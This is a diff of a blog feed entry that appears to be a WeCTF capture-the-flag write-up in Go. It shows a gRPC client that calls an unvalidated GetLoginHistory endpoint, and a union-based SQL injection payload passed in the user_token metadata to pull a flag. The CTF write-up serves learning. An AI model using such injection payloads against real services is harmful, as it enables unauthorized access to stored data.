@@ -57,26 +57,27 @@ through the steps of invoking the <code>AuthSrv</code> and registering, but it t
 that wasn&rsquo;t actually needed&ndash;the <code>GetLoginHistory</code> is only checking the token
 exists, without validation.</p>
 <div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;light.w-va.cf:1004&#34;</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">WithInsecure</span><span class="p">())</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-	<span class="p">}</span>
-	<span class="k">defer</span> <span class="nx">conn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
-	<span class="nx">srvc</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nf">NewSrvClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
-	<span class="nx">srvreq</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nx">SrvRequest</span><span class="p">{}</span>
-	<span class="nx">srvresp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">srvc</span><span class="p">.</span><span class="nf">GetLoginHistory</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">srvreq</span><span class="p">)</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-	<span class="p">}</span>
-	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">srvresp</span><span class="p">)</span>
+  <span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;light.w-va.cf:1004&#34;</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">WithInsecure</span><span class="p">())</span>
+  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+    <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+  <span class="p">}</span>
+  <span class="k">defer</span> <span class="nx">conn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+  <span class="nx">srvc</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nf">NewSrvClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
+  <span class="nx">srvreq</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nx">SrvRequest</span><span class="p">{}</span>
+  <span class="nx">srvresp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">srvc</span><span class="p">.</span><span class="nf">GetLoginHistory</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">srvreq</span><span class="p">)</span>
+  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+    <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+  <span class="p">}</span>
+  <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">srvresp</span><span class="p">)</span>
 <span class="p">}</span>
-</code></pre></div><p>It took me a bit more effort to figure out how to pass a <code>user_token</code> into the
+</code></pre></div><p>This got the Nil response. It took me a bit more effort to figure out how to pass a <code>user_token</code> into the
 <code>md</code> via the <code>metadata.FromIncomingContext(ctx)</code>. And from there,
 a union-based sql injection to get the flag.</p>
 <div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go">  <span class="nx">srvc</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nf">NewSrvClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
   <span class="nx">md</span> <span class="o">:=</span> <span class="nx">metadata</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;user_token&#34;</span><span class="p">:</span> <span class="s">&#34;&#39;)) union select flag from flags--&#34;</span><span class="p">})</span>
   <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">metadata</span><span class="p">.</span><span class="nf">NewOutgoingContext</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">md</span><span class="p">)</span>
   <span class="nx">srvreq</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nx">SrvRequest</span><span class="p">{}</span>
+  <span class="nx">srvresp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">srvc</span><span class="p">.</span><span class="nf">GetLoginHistory</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">srvreq</span><span class="p">)</span>
 </code></pre></div><p>It was cool to learn about grpc and xorm as well&ndash;haven&rsquo;t done serious golang in
 a while. Thanks wectf. :)</p>
 ]]></content>
